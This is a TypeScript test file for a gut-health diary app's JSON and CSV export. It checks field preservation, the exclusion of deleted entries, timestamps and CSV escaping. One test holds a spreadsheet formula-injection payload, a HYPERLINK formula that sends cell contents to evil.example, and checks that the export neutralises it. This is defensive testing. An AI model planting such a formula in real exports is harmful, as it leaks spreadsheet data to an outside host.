import {
  makeBowel,
  makeContext,
  makeMeal,
  makeSymptom,
  makeWellbeing,
  tombstone,
} from '@/domain/pattern-engine/fixtures/builders';
import type { LogSet } from '@/domain/pattern-engine/observations';

import {
  buildCsvExports,
  buildDiaryExport,
  buildJsonExport,
  EXPORT_FORMAT_VERSION,
  type ExportMeta,
} from '../exportDiary';

/**
 * The diary, in a form the user can keep (spec §98).
 *
 * The tests worth having here are about honesty rather than formatting: that nothing is quietly
 * dropped, that a deleted entry stays deleted, that both readings of a timestamp survive, and that
 * an empty diary produces an export rather than nothing.
 */

const emptyLogs: LogSet = { meals: [], symptoms: [], bowel: [], wellbeing: [], context: [] };

const META: ExportMeta = {
  generatedAt: new Date('2026-09-06T08:00:00.000Z'),
  userId: 'user-1',
  appVersion: '0.1.0',
};

const logsWith = (overrides: Partial<LogSet>): LogSet => ({ ...emptyLogs, ...overrides });

const parse = (logs: LogSet) => JSON.parse(buildJsonExport(logs, META)) as Record<string, never>;

const csv = (logs: LogSet, name: string) =>
  buildCsvExports(logs).find((file) => file.name === name)?.content ?? '';

describe('the JSON export', () => {
  it('names its format and version, so it can be read years later', () => {
    const document = parse(emptyLogs) as unknown as Record<string, unknown>;

    expect(document.format).toBe('gutsignal-export');
    expect(document.formatVersion).toBe(EXPORT_FORMAT_VERSION);
    expect(document.generatedAt).toBe('2026-09-06T08:00:00.000Z');
  });

  // Someone rebuilding their history elsewhere needs the fields the UI never shows.
  it('keeps every field, including the ones no screen displays', () => {
    const logs = logsWith({ symptoms: [makeSymptom('2026-06-01', { severity: 7 })] });
    const [entry] = (parse(logs) as unknown as { symptoms: Record<string, unknown>[] }).symptoms;

    expect(entry).toMatchObject({
      symptom: 'bloating',
      severity: 7,
      source: expect.any(String) as unknown as string,
    });
    expect(entry?.createdAt).toBeDefined();
    expect(entry?.updatedAt).toBeDefined();
  });

  // §16: a day boundary cannot be rebuilt from UTC alone, and an entry near midnight would move.
  it('records both the instant and what the clock said', () => {
    const logs = logsWith({ symptoms: [makeSymptom('2026-06-01', { hour: 23 })] });
    const [entry] = (
      parse(logs) as unknown as { symptoms: { occurred: Record<string, unknown> }[] }
    ).symptoms;

    expect(entry?.occurred).toMatchObject({
      localDate: '2026-06-01',
      timeZone: expect.any(String) as unknown as string,
      utcOffsetMinutes: expect.any(Number) as unknown as number,
    });
    expect(entry?.occurred.at).toBeDefined();
    expect(entry?.occurred.localTime).toBeDefined();
  });

  it('carries a meal with its items and tags', () => {
    const logs = logsWith({ meals: [makeMeal('2026-06-01', { items: ['oats', 'milk'] })] });
    const [meal] = (parse(logs) as unknown as { meals: Record<string, unknown>[] }).meals;

    expect(meal?.items).toEqual(['oats', 'milk']);
  });

  // A tombstone is how a deletion replicates between devices. It is not part of anyone's diary.
  it('leaves out entries the user deleted', () => {
    const logs = logsWith({
      symptoms: [makeSymptom('2026-06-01', { id: 'kept' }), tombstone(makeSymptom('2026-06-02'))],
    });

    const document = parse(logs) as unknown as { symptoms: { id: string }[] };
    expect(document.symptoms).toHaveLength(1);
    expect(document.symptoms[0]?.id).toBe('kept');
  });

  it('orders entries oldest first', () => {
    const logs = logsWith({
      symptoms: [
        makeSymptom('2026-06-03', { id: 'c' }),
        makeSymptom('2026-06-01', { id: 'a' }),
        makeSymptom('2026-06-02', { id: 'b' }),
      ],
    });

    const document = parse(logs) as unknown as { symptoms: { id: string }[] };
    expect(document.symptoms.map((entry) => entry.id)).toEqual(['a', 'b', 'c']);
  });

  // An export run twice on an unchanged diary should be the same file.
  it('is byte-identical when run twice', () => {
    const logs = logsWith({
      symptoms: [makeSymptom('2026-06-01'), makeSymptom('2026-06-02')],
      meals: [makeMeal('2026-06-01', { items: ['rice'] })],
    });

    expect(buildJsonExport(logs, META)).toBe(buildJsonExport(logs, META));
  });

  // The file has to explain itself to whoever opens it in five years.
  it('says what it does and does not contain', () => {
    const document = parse(emptyLogs) as unknown as { about: string };

    expect(document.about).toMatch(/deleted entries are not included/i);
    expect(document.about).toMatch(/worked out from these entries/i);
  });

  it('produces a valid document for a diary with nothing in it', () => {
    const document = parse(emptyLogs) as unknown as Record<string, unknown[]>;

    expect(document.symptoms).toEqual([]);
    expect(document.meals).toEqual([]);
  });
});

describe('the CSV exports', () => {
  it('writes one file per log type, even the empty ones', () => {
    const names = buildCsvExports(emptyLogs).map((file) => file.name);

    expect(names).toEqual([
      'gutsignal-meals.csv',
      'gutsignal-symptoms.csv',
      'gutsignal-bowel-movements.csv',
      'gutsignal-good-days.csv',
      'gutsignal-context.csv',
    ]);
  });

  // A missing file reads as "the export failed"; an empty one reads as "you logged none of these",
  // and only the second is true.
  it('gives an empty type its header rather than no file', () => {
    expect(csv(emptyLogs, 'gutsignal-symptoms.csv')).toContain('symptom,severity_1_to_10,note');
  });

  it('names its units in the header, so a column cannot be misread', () => {
    expect(csv(emptyLogs, 'gutsignal-symptoms.csv')).toContain('severity_1_to_10');
    expect(csv(emptyLogs, 'gutsignal-bowel-movements.csv')).toContain('bristol_type_1_to_7');
  });

  it('writes a symptom row with both readings of the time', () => {
    const logs = logsWith({ symptoms: [makeSymptom('2026-06-01', { severity: 6 })] });
    const file = csv(logs, 'gutsignal-symptoms.csv');

    expect(file).toContain('2026-06-01');
    expect(file).toContain('bloating');
    expect(file).toContain(',6,');
  });

  it('joins meal items into one cell rather than losing them', () => {
    const logs = logsWith({ meals: [makeMeal('2026-06-01', { items: ['oats', 'milk'] })] });

    expect(csv(logs, 'gutsignal-meals.csv')).toContain('oats; milk');
  });

  it('leaves deleted entries out of the CSV too', () => {
    const logs = logsWith({ bowel: [tombstone(makeBowel('2026-06-01'))] });
    const file = csv(logs, 'gutsignal-bowel-movements.csv');

    expect(file.split('\r\n')).toHaveLength(1);
  });

  it('exports a context entry with whichever value it has', () => {
    const logs = logsWith({ context: [makeContext('2026-06-01', { type: 'stress', value: 4 })] });

    expect(csv(logs, 'gutsignal-context.csv')).toContain('stress');
    expect(csv(logs, 'gutsignal-context.csv')).toContain(',4,');
  });

  it('exports a good day', () => {
    const logs = logsWith({ wellbeing: [makeWellbeing('2026-06-01')] });

    expect(csv(logs, 'gutsignal-good-days.csv')).toContain('2026-06-01');
  });

  // The property that spans both modules, and the one this export is most likely to be judged on:
  // a note is free text, and this file is meant to be handed to a clinician.
  it('neutralises a formula a user typed into a note', () => {
    const payload = '=HYPERLINK("https://evil.example/"&A1,"click")';
    const logs = logsWith({ symptoms: [{ ...makeSymptom('2026-06-01'), note: payload }] });

    const file = csv(logs, 'gutsignal-symptoms.csv');

    // Neutralised, and no longer a formula in any cell.
    expect(file).toContain("'=HYPERLINK");
    expect(file).not.toMatch(/,=HYPERLINK/);

    // The note is still readable. Its quotes are doubled by RFC 4180 escaping, which is why the
    // raw payload does not appear verbatim — the content survives, the execution does not.
    expect(file).toContain('evil.example');
    expect(file).toContain('""https://evil.example/""');
  });

  it('keeps a note containing a comma in one cell', () => {
    const logs = logsWith({
      symptoms: [{ ...makeSymptom('2026-06-01'), note: 'worse after lunch, better by six' }],
    });

    const rows = csv(logs, 'gutsignal-symptoms.csv').split('\r\n');

    expect(rows).toHaveLength(2);
    expect(rows[1]).toContain('"worse after lunch, better by six"');
  });
});

describe('the whole export', () => {
  it('is the JSON file plus one CSV per type', () => {
    const files = buildDiaryExport(emptyLogs, META);

    expect(files.map((file) => file.name)).toEqual([
      'gutsignal-diary.json',
      'gutsignal-meals.csv',
      'gutsignal-symptoms.csv',
      'gutsignal-bowel-movements.csv',
      'gutsignal-good-days.csv',
      'gutsignal-context.csv',
    ]);
  });

  it('gives every file content, so none is written empty', () => {
    for (const file of buildDiaryExport(emptyLogs, META)) {
      expect(file.content.length).toBeGreaterThan(0);
    }
  });
});
